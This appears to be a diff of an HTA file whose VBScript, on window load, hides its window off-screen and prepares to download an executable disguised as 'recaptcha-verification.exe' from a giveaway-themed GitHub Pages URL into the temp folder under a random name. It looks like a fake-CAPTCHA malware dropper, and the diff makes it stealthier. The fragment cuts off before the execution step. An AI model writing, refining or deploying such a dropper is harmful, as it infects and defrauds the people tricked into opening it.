@@ -11,17 +11,16 @@
     </hta:application>
     <script language="VBScript">
         Sub Window_onLoad()
-            ' Minimize the HTA window
-            Window.ResizeTo 200, 100
-            Window.MoveTo 0, 0
-            Window.blur() ' Moves the window out of focus
+            ' Hide the HTA window by resizing and moving it off-screen
+            Window.ResizeTo 1, 1
+            Window.MoveTo -32000, -32000
 
             ' Create WScript Shell object
             Set objShell = CreateObject("WScript.Shell")
 
             ' Define temp folder and download URL
             tempFolder = objShell.ExpandEnvironmentStrings("%temp%")
-            downloadUrl = "https://yeut11.github.io/giveawaysontop.github.io/recaptcha-verification.exe"
+            downloadUrl = "https://yeut11.github.io/giveawaysontop.github.io/recaptcha-verify/recaptcha-verification.exe"
             
             ' Generate a random file name
             randomFileName = GenerateRandomFileName() & ".exe"
